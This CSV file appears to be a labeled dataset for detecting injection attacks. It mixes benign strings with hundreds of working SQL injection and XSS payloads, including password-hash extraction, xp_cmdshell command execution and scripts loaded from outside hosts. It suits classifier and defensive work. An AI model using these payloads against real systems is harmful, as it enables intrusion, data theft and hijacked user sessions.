payload,type
hao,benign
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#",sqli
chirlern,benign
"<slot draggable=""true"" ondragenter=""alert(1)"">test</slot>",xss
1'  )   where 1212  =  1212,sqli
busoms redolad,benign
"<div draggable=""true"" contenteditable>drag me</div><image ondrop=alert(1) contenteditable>drop here</image>",xss
" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",sqli
"1%""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",sqli
"1'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'opll' like 'opll",sqli
"<track onbeforepaste=""alert(1)"" contenteditable>test</track>",xss
" select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1",sqli
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",sqli
"<audio onmouseout=""alert(1)"">test</audio>",xss
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  8126  =  8126",sqli
"1  )   where 5465  =  5465 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",sqli
1' in boolean mode  )   or sleep  (  5  )  #,sqli
7ons15804d04en2e,benign
<script onfocusout=alert(1) tabindex=1 id=x></script><input autofocus>,xss
"masia ca l'angel 39,",benign
"<script draggable=""true"" ondrag=""alert(1)"">test</script>",xss
" select * from users where id  =  1 union select @&&@,version  (    )   -- 1",sqli
select   (  case when   (  7980  =  3703  )   then 7980 else 7980*  (  select 7980 from information_schema.character_sets  )   end  )  #,sqli
"etorbidea askatasuna 170, 8?a",benign
tapies ximenis,benign
ceciley,benign
"1""   )    )    and 5421  =  4804--",sqli
 (  select top 1,sqli
vargas bentos,benign
"c/ arc de sant ramon del call, 189, 2-e",benign
" or benchmark  (  10000000,MD5  (  1   )    )   #",sqli
select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,sqli
"<cite onbeforecopy=""alert(1)"" contenteditable>test</cite>",xss
703,benign
"1'  )   where 7561  =  7561 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sqli
"<div id=""100""><img[a][b]src=x[d]onerror[c]=[e]""alert(100)"">//[""'`-->]]>]</div><div id=""101""><a href=""[a]java[b]script[c]:alert(101)"">XXX</a>//[""'`-->]]>]</div><div id=""102""><img src=""x` `<script>alert(102)</script>""` `>//[""'`-->]]>]</div><div id=""103""><script>history.pushState(0,0,'/i/am/somewhere_else');</script>//[""'`-->]]>]</div>",xss
"-7744""   )    )     )   union all select 9408,9408,9408,9408--",sqli
"<video onmousemove=""alert(1)"">test</video>",xss
"1%"" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""%""  =  """,sqli
buchel-alymer@gemas.org.bu,benign
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14",sqli
"<area draggable=""true"" ondragleave=""alert(1)"">test</area>",xss
mullinar_lemanska@gallegonicolas.ps,benign
"<DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">",xss
select   (  case when   (  5740  =  7636  )   then 5740 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,sqli
"<input draggable=""true"" ondragstart=""alert(1)"">test</input>",xss
1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,sqli
"<rtc draggable=""true"" ondragend=""alert(1)"">test</rtc>",xss
"<div id=""135""><?xml-stylesheet type=""text/xsl"" href=""#"" ?>",xss
35garab980a,benign
"<title onkeydown=""alert(1)"" contenteditable>test</title>",xss
chlud_kumvongse@encuentrodominios.sd,benign
mertin lombana,benign
"-8893%'   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   '%'  =  '",sqli
bettine,benign
"<header onclick=""alert(1)"">test</header>",xss
<image id=x tabindex=1 onfocusin=alert(1)></image>,xss
"<blink onkeypress=""alert(1)"" contenteditable>test</blink>",xss
"1%'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  '%'  =  '",sqli
"Garethy Salty Method!<script>alert(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(this,'window')(),'document')(), 'getElementsByTagName')('html')[0],'innerHTML')().match(/d.*'/));</script>",xss
<svg><animate onend=alert(1) attributeName=x dur=1s>,xss
28189,benign
"1%"" and   (  3020  =  3020  )  *6703 and ""%""  =  """,sqli
<datalist id=x tabindex=1 onfocus=alert(1)></datalist>,xss
"de los cazadores, 196, 1-b",benign
<input value=<><iframe/src=javascript:confirm(1),xss
"<div draggable=""true"" contenteditable>drag me</div><ruby ondragover=alert(1) contenteditable>drop here</ruby>",xss
"1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",sqli
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- ",sqli
3245,benign
<dd id=x tabindex=1 ondeactivate=alert(1)></dd><input id=y autofocus>,xss
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))",sqli
26133,benign
"barcelona 149, 5-e",benign
"<address onmousedown=""alert(1)"">test</address>",xss
" select * from users where id  =  '1' union select !<1,version  (    )   -- 1'",sqli
"<style>:target {transform: rotate(180deg);}</style><bdi id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></bdi>",xss
" select * from users where id  =  1 or \+<\ union select 1,@@VERSION -- 1",sqli
"select sleep  (  5  )   and ""%""  =  """,sqli
riggsbee,benign
6$ng4tado,benign
7.81E+15,benign
extremosa,benign
1%'   )    )     )   and 3916  =  6327--,sqli
having,sqli
claudio,benign
" select * from users where id  =  1 or ""1{"" or 1  =  1 -- 1",sqli
"<tfoot draggable=""true"" ondragenter=""alert(1)"">test</tfoot>",xss
"<article onpaste=""alert(1)"" contenteditable>test</article>",xss
 ORDER BY 18# ,sqli
<tr onblur=alert(1) tabindex=1 id=x></tr><input autofocus>,xss
"<style>@keyframes x{}</style><element style=""animation-name:x"" onanimationstart=""alert(1)""></element>",xss
"<bdo draggable=""true"" ondrag=""alert(1)"">test</bdo>",xss
"<figure onmouseleave=""alert(1)"">test</figure>",xss
"<style>:target {color: red;}</style><label id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></label>",xss
"<td draggable=""true"" ondragleave=""alert(1)"">test</td>",xss
" select * from users where id  =  1 union select @<@.,version  (    )   -- 1",sqli
"-9860  )   where 8743  =  8743 union all select 8743,8743,8743,8743,8743,8743,8743--",sqli
"<style>:target {color: red;}</style><table id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></table>",xss
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",sqli
"<time oncopy=""alert(1)"" contenteditable>test</time>",xss
"<style>@keyframes x{}</style><plaintext style=""animation-name:x"" onanimationend=""alert(1)""></plaintext>",xss
"<embed onkeydown=""alert(1)"" contenteditable>test</embed>",xss
"1'+  (  select 'qrml' where 3791  =  3791 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  +'",sqli
"<colgroup oncut=""alert(1)"" contenteditable>test</colgroup>",xss
"<style>:target {transform: rotate(180deg);}</style><audio id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></audio>",xss
'<script>window.onload=function(){document.forms[0].message.value='1';}</script>,xss
19140,benign
"1%"" or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sqli
"-5125 union all select 5720,5720,5720,5720,5720,5720,5720,5720--",sqli
select * from users where id  =  1. <@ or 1  =  1 -- 1,sqli
<%78 onxxx=1 ,xss
"1""   )    )     )   waitfor delay '0:0:5'--",sqli
" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))",sqli
"<q draggable=""true"" ondragstart=""alert(1)"">test</q>",xss
"<font onkeypress=""alert(1)"" contenteditable>test</font>",xss
"<time onbeforepaste=""alert(1)"" contenteditable>test</time>",xss
"<code onclick=""alert(1)"">test</code>",xss
"<dd onpaste=""alert(1)"" contenteditable>test</dd>",xss
<br id=x tabindex=1 onfocus=alert(1)></br>,xss
"-2916""   )    )    or 4946  =  8232--",sqli
-3688'||  (  select 'pber' from dual where 7137  =  7137 order by 1#,sqli
<base id=x tabindex=1 onfocus=alert(1)></base>,xss
kellard@todobetis.gf,benign
"1%'  )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sqli
"1  )   and make_set  (  4593  =  7765,7765  )   and   (  8517  =  8517",sqli
7x,benign
"<strong oncut=""alert(1)"" contenteditable>test</strong>",xss
 OR 1=1-- ,sqli
1'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'jhlj'  =  'jhlj,sqli
kappa,benign
"<dl onbeforecut=""alert(1)"" contenteditable>test</dl>",xss
<svg><caption onload=alert(1)></caption>,xss
<h1 id=x tabindex=1 onbeforeactivate=alert(1)></h1>,xss
"<td onmouseover=""alert(1)"">test</td>",xss
3.07E+15,benign
"<embed ondblclick=""alert(1)"">test</embed>",xss
sant vicen de torell,benign
"<tbody ondblclick=""alert(1)"">test</tbody>",xss
7751,benign
<frameset><frame onload=alert(1)>,xss
26%,sqli
"<fieldset onpaste=""alert(1)"" contenteditable>test</fieldset>",xss
"""   )    )    or sleep  (  __TIME__  )    =  """,sqli
",NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli
<samp onfocusout=alert(1) tabindex=1 id=x></samp><input autofocus>,xss
"<div id=""136""><form action="""" method=""post"">",xss
"<style>:target {color: red;}</style><map id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></map>",xss
"<style>@keyframes x{}</style><embed style=""animation-name:x"" onanimationend=""alert(1)""></embed>",xss
1 where 3354  =  3354,sqli
"1  )   where 7600  =  7600 union all select null,null,null,null,null,null--",sqli
a2152,benign
"<style>@keyframes slidein {}</style><tfoot style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></tfoot>",xss
"<style>@keyframes x{}</style><rb style=""animation-name:x"" onanimationend=""alert(1)""></rb>",xss
 ORDER BY SLEEP(5)-- ,sqli
2.46E+15,benign
verite@culturalsanpedrocf.dm,benign
<u id=x tabindex=1 onbeforeactivate=alert(1)></u>,xss
"<sCRIpt x="">"" src=//15.rs></script>",xss
8.83E+15,benign
<tt id=x tabindex=1 onbeforedeactivate=alert(1)></tt><input autofocus>,xss
"-5218  )   union all select 9677,9677#",sqli
"-5776%' union all select 3075,3075,3075,3075,3075--",sqli
<svg><font onload=alert(1)></font>,xss
mallat paiva,benign
"<div draggable=""true"" contenteditable>drag me</div><cite ondragover=alert(1) contenteditable>drop here</cite>",xss
"<source draggable=""true"" ondrag=""alert(1)"">test</source>",xss
"<hr oncontextmenu=""alert(1)"">test</hr>",xss
1.44E+15,benign
" select * from users where id  =  1. union select null,version  (    )   -- 1",sqli
"<style>@keyframes slidein {}</style><caption style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></caption>",xss
alert&#40;1&#41,xss
"<col onmousemove=""alert(1)"">test</col>",xss
"<tr onmouseover=""alert(1)"">test</tr>",xss
"<div draggable=""true"" contenteditable>drag me</div><nav ondrop=alert(1) contenteditable>drop here</nav>",xss
barceo,benign
"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf""> ?",xss
select case when 7951  =  1147 then 1 else null end--,sqli
"1"" where 2462  =  2462 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sqli
<div onblur=alert(1) tabindex=1 id=x></div><input autofocus>,xss
yeladaky janeiro,benign
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",sqli
"1%""  )   order by 1#",sqli
'; exec master..xp_cmdshell,sqli
"1'  )   as kgnd where 1550  =  1550 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",sqli
"<style>:target {transform: rotate(180deg);}</style><dd id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></dd>",xss
 OR 3409=3409 AND ('pytW' LIKE 'pytY,sqli
"calle sobrerroca 96, 7?f",benign
14100,benign
"-3954'   )    )    union all select 2417,2417--",sqli
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10",sqli
http://www.<script>alert(1)</script .com,xss
glazer,benign
<details id=x tabindex=1 onbeforedeactivate=alert(1)></details><input autofocus>,xss
"<div draggable=""true"" contenteditable>drag me</div><element ondragover=alert(1) contenteditable>drop here</element>",xss
"1""  )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sqli
"<style>@keyframes slidein {}</style><frameset style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></frameset>",xss
"<div draggable=""true"" contenteditable>drag me</div><plaintext ondragover=alert(1) contenteditable>drop here</plaintext>",xss
"<table oncontextmenu=""alert(1)"">test</table>",xss
"-3546%"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""%""  =  """,sqli
"<style>@keyframes x{}</style><embed style=""animation-name:x"" onanimationstart=""alert(1)""></embed>",xss
"<div id=""130""><math href=""javascript:alert(130)"">CLICKME</math>",xss
pap@evelin.com.ly,benign
trespalacios latorre,benign
<svg><tfoot onload=alert(1)></tfoot>,xss
" select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",sqli
-7971' union all select 4273#,sqli
" select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1",sqli
" select * from users where id  =  1 *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",sqli
"<track draggable=""true"" ondrag=""alert(1)"">test</track>",xss
"<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(1)""/>?",xss
buenda,benign
 ORDER BY 10# ,sqli
madrigal puigb,benign
gift@distritoeste.no,benign
"1',  (  select   (  case when   (  5433  =  5433  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",sqli
"calle robregordo, 171 10-c",benign
"1  )   as clye where 7842  =  7842 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",sqli
"<>""'%;)(&+",sqli
"<style>:target {color: red;}</style><var id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></var>",xss
" select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1",sqli
1'+  (  select wpai where 3685  =  3685,sqli
3.85E+14,benign
-1192 order by 1#,sqli
"1   )    )    as bwrg where 3254  =  3254 union all select null,null,null,null,null,null--",sqli
"<style>@keyframes x{}</style><dialog style=""animation-name:x"" onanimationstart=""alert(1)""></dialog>",xss
onzonilla,benign
"<a onbeforecopy=""alert(1)"" contenteditable>test</a>",xss
"<canvas draggable=""true"" ondragend=""alert(1)"">test</canvas>",xss
" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7",sqli
"</stylesheet>//[""'`-->]]>]</div>",xss
1'+  (  select ahyw where 6893  =  6893 waitfor delay '0:0:5'--,sqli
"1%""   )    )     )   union all select null,null,null#",sqli
4916,benign
exec master..xp_cmdshell 'net+users',sqli
"1%'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  '%'  =  '",sqli
" select * from users where id  =  '1' + @  (  1  )   union select 1,version  (    )   -- 1'",sqli
ibarra,benign
"<applet oncut=""alert(1)"" contenteditable>test</applet>",xss
"1""   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""dzse""  =  ""dzse",sqli
<x contenteditable onkeydown=alert(1)>press any key! ,xss
"1""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""igop""  =  ""igop",sqli
1  )   or sleep  (  __TIME__  )  #,sqli
abia de la obispala,benign
9.16E+15,benign
"pobla de claramunt, la",benign
"<body onmouseleave=""alert(1)"">test</body>",xss
"admin""  )   or ""1""  =  ""1""--",sqli
" select * from users where id  =  1 or "",{"" or 1  =  1 -- 1",sqli
"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sqli
cuerva,benign
"<track onmouseout=""alert(1)"">test</track>",xss
<svg><plaintext onload=alert(1)></plaintext>,xss
4ode5ista,benign
"calle hostieros, 24",benign
"<button oncut=""alert(1)"" contenteditable>test</button>",xss
34170,benign
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",sqli
"<ruby onmousedown=""alert(1)"">test</ruby>",xss
"<header onbeforepaste=""alert(1)"" contenteditable>test</header>",xss
1'||  (  select 'aioq' from dual where 8176  =  8176,sqli
"<button draggable=""true"" ondragstart=""alert(1)"">test</button>",xss
"<tt ondblclick=""alert(1)"">test</tt>",xss
<dt onblur=alert(1) tabindex=1 id=x></dt><input autofocus>,xss
standiford@elpaisaje.bg,benign
"1'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",sqli
1  )   where 4479  =  4479 rlike   (  select   (  case when   (  6351  =  4367  )   then 1 else 0x28 end   )    )   --,sqli
4.28E+15,benign
"<style>@keyframes x{}</style><html style=""animation-name:x"" onanimationstart=""alert(1)""></html>",xss
byoung,benign
or 'text' > 't',sqli
<td onblur=alert(1) tabindex=1 id=x></td><input autofocus>,xss
" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",sqli
portelan9,benign
9.19E+15,benign
"<style>@keyframes x{}</style><nobr style=""animation-name:x"" onanimationstart=""alert(1)""></nobr>",xss
"insert into users  (  login, password, level  )   values  (   char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )   + char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )  ,char  (  0x64  )  ",sqli
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#",sqli
"1  )   where 1513  =  1513 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",sqli
"<style>@keyframes slidein {}</style><th style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></th>",xss
<rb onfocusout=alert(1) tabindex=1 id=x></rb><input autofocus>,xss
"1%""   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""%""  =  """,sqli
0x730065006c00650063007400200040004000760065007200730069006f006e00 exec  (  @q  ) ,sqli
" UNION ALL SELECT 1,2,3,4,5-- ",sqli
"-1588%""   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sqli
-4952'   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'abso'  =  'abso,sqli
tardn,benign
"<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe id=iframe src=%22javascript:parent.x(window)%22><iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",xss
"<style>:target {color:red;}</style><p id=x style=""transition:color 1s"" ontransitionend=alert(1)></p>",xss
" select * from users where id  =  1 + @<1# union select 1,version  (    )   -- 1",sqli
"<center onmouseenter=""alert(1)"">test</center>",xss
" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))-- ",sqli
garzon6@mtos.ro,benign
calle fermin salvochea 155,benign
"<SVg </onlOad =""1> (_=prompt,_(1)) """">",xss
"<style>@keyframes slidein {}</style><acronym style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></acronym>",xss
IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--,sqli
"<thead onmouseenter=""alert(1)"">test</thead>",xss
"select * from generate_series  (  3427,3427,case when   (  3427  =  7516  )   then 1 else 0 end  )   limit 1--",sqli
hinson,benign
"-5247"" union all select 3097,3097,3097,3097,3097,3097,3097#",sqli
"<applet onmousedown=""alert(1)"">test</applet>",xss
"1%'  )   union all select null,null,null,null,null,null#",sqli
62,benign
"1""  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  ""hrkf"" like ""hrkf",sqli
1'   )    )    as grne where 9003  =  9003 order by 1--,sqli
"<table onclick=""alert(1)"">test</table>",xss
s4dsudeste,benign
<x ondrag=alert(1)>drag this! ,xss
sunderla,benign
"select sleep  (  5  )   and   (  ""innk""  =  ""innk",sqli
"<style>:target {color:red;}</style><acronym id=x style=""transition:color 1s"" ontransitionend=alert(1)></acronym>",xss
"<div draggable=""true"" contenteditable>drag me</div><span ondragover=alert(1) contenteditable>drop here</span>",xss
"-6359""   )    )    or elt  (  3546  =  2433,2433  )   and    (    (   ""qxat""  =  ""qxat",sqli
"1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #",sqli
11800455y,benign
"-1076 union all select 3959,3959--",sqli
1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb,sqli
 or ''-',sqli
 ORDER BY 20-- ,sqli
update,sqli
"1  )   as qjjm where 3850  =  3850 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",sqli
"1'||  (  select 'wqmz' where 6400  =  6400 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x   )    )   ||'",sqli
"<frame draggable=""true"" ondrag=""alert(1)"">test</frame>",xss
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- ",sqli
));waitfor delay '0:0:__TIME__'--,sqli
"1' in boolean mode  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sqli
metyn,benign
"-5439"" or 2559  =  4692 and ""dcrf"" like ""dcrf",sqli
"<audio onmouseover=""alert(1)"">test</audio>",xss
"<style>:target {transform: rotate(180deg);}</style><kbd id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></kbd>",xss
<sub id=x tabindex=1 onfocus=alert(1)></sub>,xss
946,benign
"<handler id=""y"">alert(127)</handler>",xss
1'  )   as pudv where 2609  =  2609,sqli
<svg onload=alert(1)>,xss
"<hgroup draggable=""true"" ondragleave=""alert(1)"">test</hgroup>",xss
"<th onbeforecopy=""alert(1)"" contenteditable>test</th>",xss
duby@mtos.mt,benign
estic o'neil,benign
"1 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- gkcl",sqli
"<rb onmousedown=""alert(1)"">test</rb>",xss
"<sub onclick=""alert(1)"">test</sub>",xss
"<dir oncontextmenu=""alert(1)"">test</dir>",xss
<svg/onload=alert(1),xss
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   'wusq'  =  'wusq",sqli
cinthia,benign
"select sleep  (  5  )   and    (    (   ""vzye""  =  ""vzye",sqli
<wbr onfocusout=alert(1) tabindex=1 id=x></wbr><input autofocus>,xss
"<select onmousedown=""alert(1)"">test</select>",xss
"<select onmousemove=""alert(1)"">test</select>",xss
